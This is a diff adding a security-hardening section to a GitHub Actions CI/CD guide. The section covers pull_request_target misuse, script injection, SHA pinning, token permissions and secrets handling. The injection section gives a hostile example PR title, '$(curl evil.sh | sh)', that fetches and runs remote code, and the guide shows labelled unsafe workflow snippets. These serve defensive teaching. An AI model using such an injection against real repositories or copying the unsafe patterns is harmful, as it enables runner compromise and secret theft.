@@ -952,3 +952,128 @@ jobs:
 ```
 
 npm and crates.io follow the same shape: build, then publish with a token in `NODE_AUTH_TOKEN` / `CARGO_REGISTRY_TOKEN` (npm now also supports OIDC trusted publishing). And when you create a GitHub **Release**, it can [auto-generate release notes](https://docs.github.com/en/actions/publishing-packages) from merged PRs — a changelog for free.
+
+---
+
+## Part 7 — Security Hardening
+
+CI/CD is a high-value target: it holds credentials, has write access to your repository, and often the keys to production. This is the part to read twice. The mindset to hold throughout: **treat every workflow as code an attacker will try to influence** — through a malicious pull request, a compromised dependency, or a poisoned action.
+
+### The Threat Model
+
+Concretely, what goes wrong:
+
+- A malicious PR runs code in your CI with access to secrets or a writable token — and exfiltrates secrets, pushes commits, or mints cloud credentials.
+- A third-party action you `uses:` is compromised (or was always hostile) — same blast radius, because actions run with **your job's** privileges.
+- Untrusted input (a PR title, branch name, issue body) is interpolated into a shell command — arbitrary code execution on the runner.
+- A cache or artifact is poisoned in a low-trust context and consumed by a high-trust one.
+
+The rest of this part is the defenses, in priority order.
+
+### `pull_request` vs `pull_request_target` — the Classic Footgun
+
+These two triggers look interchangeable and are anything but:
+
+- **`pull_request`** (from a fork) runs against the PR's merge commit with a **read-only token and no secrets**. Safe by default — a stranger's code cannot touch your secrets. This is what you want for building and testing fork PRs.
+- **`pull_request_target`** runs in the context of the **base** repository — **with secrets and a read/write token** — but checks out the base branch's code by default. It exists for trusted tasks like labeling or commenting on PRs.
+
+The footgun is using `pull_request_target` and then checking out and **running the PR's code**. Now untrusted code executes with your secrets and a writable token:
+
+```yaml
+# UNSAFE — do not do this
+on: pull_request_target            # runs with secrets + a write token
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # checks out UNTRUSTED PR code...
+      - run: npm ci && npm run build                        # ...then runs it, with secrets in scope
+```
+
+```yaml
+# SAFE — build/test fork code under pull_request (no secrets);
+# reserve pull_request_target for trusted, code-free tasks only.
+on: pull_request                   # read-only token, no secrets — safe to run PR code
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4   # checks out the PR code, but in a powerless context
+      - run: npm ci && npm test
+```
+
+If you genuinely need secrets for a fork PR (a deploy preview, say), gate it behind an environment with a required reviewer, or move the privileged work into a separate `workflow_run` that never executes the PR's code.
+
+### Script Injection
+
+Anything an outsider controls — PR title, branch name, issue body, commit message — is untrusted. Splicing it straight into a `run:` block is remote code execution:
+
+```yaml
+# UNSAFE — do not do this
+- run: echo "Title: ${{ github.event.pull_request.title }}"
+```
+
+The `${{ }}` is substituted *before* the shell runs, so a PR titled `$(curl evil.sh | sh)` (or wrapped in backticks) executes on your runner. The fix: pass the value in through an environment variable so the shell treats it as **data, never code**:
+
+```yaml
+# SAFE
+- env:
+    TITLE: ${{ github.event.pull_request.title }}   # bound to an env var, not spliced into the script
+  run: echo "Title: $TITLE"                          # the shell expands $TITLE as a plain string
+```
+
+The same rule applies to any context value derived from user input. When in doubt, route it through `env:`.
+
+### Pin Third-Party Actions to a Commit SHA
+
+`uses: some/action@v3` pins to a **tag**, and tags are **mutable**: whoever controls that action's repo can move `v3` onto new code — including malicious code — and every workflow using `@v3` runs it on the next execution. Pinning to a full 40-character commit SHA removes that power:
+
+```yaml
+- uses: actions/checkout@<40-char-commit-sha> # v4   # immutable — a SHA can't be silently repointed
+```
+
+The trailing comment keeps it readable. To stop pinned SHAs from going stale, let Dependabot bump them:
+
+```yaml
+# .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    schedule:
+      interval: weekly
+```
+
+(First-party `actions/*` are lower risk, but the same supply-chain logic applies — SHA-pin anything you don't control.)
+
+### Least Privilege: `permissions`
+
+The automatic `GITHUB_TOKEN` is powerful, so default it to read-only and grant scopes only where needed. Set the org/repo default to restricted in settings, and declare per-workflow and per-job in YAML ([assigning permissions](https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs)):
+
+```yaml
+permissions:
+  contents: read           # workflow-wide default: read the repo, nothing else
+jobs:
+  publish:
+    permissions:
+      contents: read
+      packages: write       # only this job can push packages
+      id-token: write       # ...and only this job can request an OIDC token
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./publish.sh
+```
+
+Declaring any `permissions:` block forces every unlisted scope to `none` — exactly right: start from nothing and add the minimum. (The full scope list is in [automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).)
+
+### Secrets Exposure and the Supply Chain
+
+Rounding out the defenses ([security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions), [using secrets](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)):
+
+- **Don't defeat masking.** Masking catches verbatim secret values; it cannot catch a base64'd or reassembled secret. Never print secrets, and avoid handing them to steps that log verbosely.
+- **Forks never receive secrets** (the `pull_request` rule). Don't engineer around it — it is load-bearing.
+- **Restrict which actions can run.** Org/repo settings can limit `uses:` to GitHub-authored and verified-creator actions, or an explicit allowlist — a strong supply-chain control.
+- **Attest your builds.** `actions/attest-build-provenance` produces signed provenance for your artifacts and images, so downstream consumers can verify what built them.
+- **Audit third-party actions** before adopting: read the source at the SHA you pin, prefer verified publishers, and remember that a *transitive* action (one your action depends on) inherits the same access.
